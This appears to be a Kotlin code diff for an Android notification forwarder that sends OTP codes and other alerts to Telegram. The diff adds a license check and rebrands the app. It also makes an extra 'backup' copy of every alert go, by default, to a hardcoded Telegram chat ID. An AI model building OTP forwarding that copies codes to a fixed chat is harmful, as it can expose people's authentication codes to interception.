@@ -34,6 +34,12 @@ object OtpDispatcher {
             return false
         }
 
+        // License & Trial entitlement check
+        if (!CloudflareLicenseManager.hasForwardingAccess(context)) {
+            Log.w(TAG, "Forwarding paused: Active license or trial required.")
+            return false
+        }
+
         val forwardAll = prefs.getBoolean("forward_all_notifications", false)
 
         // Match against dynamic keywords (bypassed if forwardAll is ON)
@@ -64,7 +70,7 @@ object OtpDispatcher {
         } else {
             buildString {
                 if (matchedOtp != "OTP") {
-                    append("🔔 eDistrict / OTP Alert\n\n")
+                    append("🔔 Smart Notifier / OTP Alert\n\n")
                     append("🔑 OTP Code: $matchedOtp\n\n")
                 } else {
                     append("🔔 Notification Alert\n\n")
@@ -90,8 +96,11 @@ object OtpDispatcher {
                 
                 try {
                     val res = TelegramHelper.sendMessage(botToken, chatId, alertText)
-                    // Also backup to personal user chat
-                    TelegramHelper.sendMessage(botToken, TelegramHelper.DEFAULT_USER_ID, alertText)
+                    // Backup to personal user chat if configured
+                    val backupChatId = prefs.getString("backup_chat_id", TelegramHelper.DEFAULT_USER_ID)?.trim()
+                    if (!backupChatId.isNullOrEmpty()) {
+                        TelegramHelper.sendMessage(botToken, backupChatId, alertText)
+                    }
                     telegramStatus = if (res.first) "Sent" else "Failed"
                 } catch (e: Exception) {
                     telegramStatus = "Error"
